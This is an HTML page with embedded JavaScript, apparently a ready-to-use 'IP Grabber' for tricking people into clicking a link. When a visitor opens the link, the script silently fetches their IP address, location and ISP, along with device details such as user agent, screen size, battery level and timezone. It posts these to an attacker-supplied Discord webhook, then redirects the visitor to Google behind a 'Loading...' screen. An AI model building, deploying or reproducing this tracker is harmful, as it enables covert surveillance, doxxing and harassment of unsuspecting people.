<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>IP Grabber</title>
  <style>
    body {
      background: #000; color: #0f0; font-family: 'Courier New';
      text-align: center; padding: 50px;
    }
    input, button {
      padding: 12px; margin: 10px; width: 90%; max-width: 500px;
      background: #111; border: 1px solid #0f0; color: #0f0;
      font-size: 1.1rem;
    }
    button { background: #0f0; color: #000; cursor: pointer; font-weight: bold; }
    #link { color: #0f0; word-break: break-all; margin: 20px; font-size: 1.2rem; }
    label { display: flex; justify-content: center; align-items: center; margin: 12px 0; font-size: 1rem; }
    input[type="checkbox"] { width: auto; transform: scale(1.4); margin: 0 10px; }
  </style>
</head>
<body>
  <h1>IP GRABBER</h1>
  <p>Enter your Discord webhook. Toggle options. Generate link. Profit.</p>

  <input id="webhook" placeholder="https://discord.com/api/webhooks/..." />

  <label><input type="checkbox" id="ip" checked> IP + Location</label>
  <label><input type="checkbox" id="pc" checked> PC Info</label>

  <button onclick="generate()">GENERATE LINK</button>

  <div id="result" style="display:none;">
    <p><strong>Send this link:</strong></p>
    <div id="link"></div>
    <button onclick="copy()">COPY LINK</button>
  </div>

  <script>
    function rand() {
      return Math.random().toString(36).substr(2, 9);
    }

    function generate() {
      const webhook = document.getElementById("webhook").value.trim();
      if (!webhook.includes("discord.com/api/webhooks")) {
        alert("Enter a valid Discord webhook URL.");
        return;
      }

      const config = {
        w: webhook,
        ip: document.getElementById("ip").checked,
        pc: document.getElementById("pc").checked
      };

      const id = rand();
      const link = `${location.origin}/?id=${id}`;
      localStorage.setItem(`hook_${id}`, JSON.stringify(config));

      document.getElementById("link").innerText = link;
      document.getElementById("result").style.display = "block";
    }

    function copy() {
      const link = document.getElementById("link").innerText;
      navigator.clipboard.writeText(link);
      alert("Copied!");
    }

    // === GRAB ON LOAD ===
    if (location.search) {
      const params = new URLSearchParams(location.search);
      const id = params.get("id");
      const config = JSON.parse(localStorage.getItem(`hook_${id}`) || "{}");
      const webhook = config.w;

      if (webhook) {
        (async () => {
          try {
            const res = await fetch("https://ipapi.co/json/");
            const data = await res.json();

            const fields = [];

            if (config.ip) {
              fields.push(
                { name: "IP", value: data.ip, inline: true },
                { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
                { name: "ISP", value: data.org || "Unknown", inline: true }
              );
            }

            if (config.pc) {
              const battery = await navigator.getBattery?.() || {};
              fields.push(
                { name: "Device", value: navigator.userAgent.slice(0, 100), inline: false },
                { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
                { name: "Battery", value: battery.level ? Math.round(battery.level * 100) + "%" : "N/A", inline: true },
                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
              );
            }

            const payload = {
              embeds: [{
                title: "NEW IP GRABBED",
                color: 65280,
                fields: fields,
                timestamp: new Date().toISOString()
              }]
            };

            await fetch(webhook, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload)
            });

            setTimeout(() => location.href = "https://google.com", 500);
          } catch (e) {
            setTimeout(() => location.href = "https://google.com", 500);
          }
        })();
      }

      document.body.innerHTML = "<h2 style='color:#0f0;'>Loading...</h2>";
    }
  </script>
</body>
</html>
